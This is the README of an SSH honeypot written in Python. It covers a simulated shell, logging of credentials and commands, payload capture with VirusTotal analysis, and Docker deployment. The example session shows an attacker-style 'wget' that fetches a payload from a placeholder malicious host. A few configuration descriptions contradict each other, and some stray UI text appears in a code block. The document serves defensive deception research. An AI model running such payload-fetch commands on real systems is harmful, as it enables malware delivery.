# SSH Honeypot - Fake SSH Server

![Honeypot Banner](https://img.shields.io/badge/SSH-Honeypot-blue?style=for-the-badge)

A lightweight and interactive **SSH honeypot** that simulates a realistic Linux environment to capture malicious behaviors.

🛡️ Developed with **Python**, using **Paramiko** for SSH protocol handling.  
🛡️ Designed for **deception**, **attack analysis**, and **cybersecurity research**.

---

## 🚀 Features

- Accepts **SSH password authentication** with realistic banners
- Simulates Linux shell environment:
  - `ls`, `pwd`, `uname -a`, `whoami`, `who`, `ps`, `cd`, etc.
- **Realistic "who" command** (shows attacker's session and fake others)
- **Dynamic fake "ps" command** (randomized process list)
- **Supports file download simulation**:
  - Detects `wget` and `curl` commands
  - Downloads payloads locally
  - **Automatic VirusTotal upload and report** (if API key configured)
- **Every typed command is logged**:
  - Human-readable logs and structured JSON logs
- Handles **exit** and **quit** commands cleanly (logout)
- **Separate SSH keys** generated for each source IP
- **Session timeout handling** (idle detection with prompt recovery)
- **Error-resistant SSH handling** (handles broken/invalid connections)
- **Concurrent connections** supported (multi-threaded)
- Can reject the connexion if login = password with a setting (LOGINPASSWD=False)
- Special credentials behavior: define EXCEPTION_CREDENTIALS to tag suspicious logins differently
- Fully **configurable** via `.env` file
- **Docker-ready** deployment

---

## 📦 Installation

### 1. Clone the repository
```bash
git clone https://github.com/jmousqueton/ssh-honeypot.git
cd ssh-honeypot
```

### 2. Create and configure the `.env` file
Copy the example and edit if needed:
```bash
cp .env.example .env
```

Available `.env` variables:

| Variable | Default | Description |
|:---------|:--------|:------------|
| `HOST` | `0.0.0.0` | Interface to bind the SSH server |
| `PORT` | `22` | Port to listen on |
| `LOG_PATH` | `./logs` | Path to save log files |
| `SERVICE_NAME` | `ssh-honeypot` | Prefix for log files |
| `LOGINPASSWD` | `True` | Refuse logins where login==password |
| `SSH_KEY_BITS` | `2048` | Size of generated SSH RSA keys |
| `DEBUG` | `False` | Enable verbose debug output |
| `VT_API_KEY` | (optional) | VirusTotal API key for file analysis |

---

## 🐉 Docker Deployment

### Build and run with Docker

```bash
docker build -t ssh-honeypot .
docker run -d --restart unless-stopped --env-file .env -p 22:22 -v $(pwd)/logs:/opt/pot-de-miel/sshd/logs --name ssh-honeypot ssh-honeypot
```

Or using `docker-compose`:

```bash
docker-compose up -d
```

---

## 📜 Logs

- **Human-readable log**:  
  `logs/ssh-honeypot.log`

- **JSON structured log**:  
  `logs/ssh-honeypot.jsonl`

Each log line includes:
- Source IP
- Username
- Password
- Session ID
- **All commands executed**
- **Payload download events** (URL, file hash)
- **VirusTotal scan results** (if configured)

---

## 🛠️ Supported Commands

| Command | Behavior |
|:--------|:---------|
| `ls` | List fake directory contents |
| `pwd` | Show fake current directory |
| `whoami` | Return "root" |
| `who` | Display attacker and fake users |
| `ps`, `ps aux`, `ps -ef` | Randomly generated fake process list |
| `cd <dir>` | Change directory (if exists in fake filesystem) |
| `wget <url>`, `curl <url>` | Fake download + local file saving + VirusTotal analysis |
| `uname -a` | Fake randomized Linux system information |
| `exit`, `quit` | Disconnect properly |

---

🔐 Special Credentials
You can define credentials that trigger special behavior (alert in logs) using the EXCEPTION_CREDENTIALS list.

Example configuration:

```python
Copier
Modifier
EXCEPTION_CREDENTIALS = [
    ("*", "3245gs5662d34"),
    ("admin", "*"),
    ("testuser", "testpass123"),
]
```

Meaning:

- Any username using password `3245gs5662d34` is rejected 
- Username `admin` with any password is rejected
- Username `testuser` with password `testpass123` is rejected

When triggered, the logs will tag these authentication attempts differently (auth_attempt_exception).

---

## 📋 Example Session

```bash
ssh julien@honeypot_ip
julien@honeypot_ip's password:
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.15.0-76-generic)

root@iot-gateway:~# who
julien   pts/1    2025-04-27 16:30 (82.65.156.219)
admin    pts/0    2025-04-27 14:10 (10.0.0.5)

root@iot-gateway:~# ps aux
root      1523  0.0  0.5  11032  5232 ?        Ss   14:21   0:00 /usr/sbin/sshd -D
mysql     2124  0.2  1.0 120000 15324 ?        Sl   14:20   0:02 /usr/sbin/mysqld

root@iot-gateway:~# wget http://malicious.example.com/payload
root@iot-gateway:~# exit
logout
Connection to honeypot_ip closed.
```

---

## ⚠️ Important Notes

- This honeypot **simulates** a Linux environment — no real shell is exposed.
- **NEVER expose** this honeypot directly to critical infrastructure.
- Use strict **firewall** and **network monitoring** for deployments.

---

## 📚 License

MIT License — Free for educational and research use.  
Not intended for malicious activities.

---

## ❤️ Contributions

Pull Requests are welcome!  
Ideas like fake netstat, fake file upload, full session playback, etc. are encouraged!

---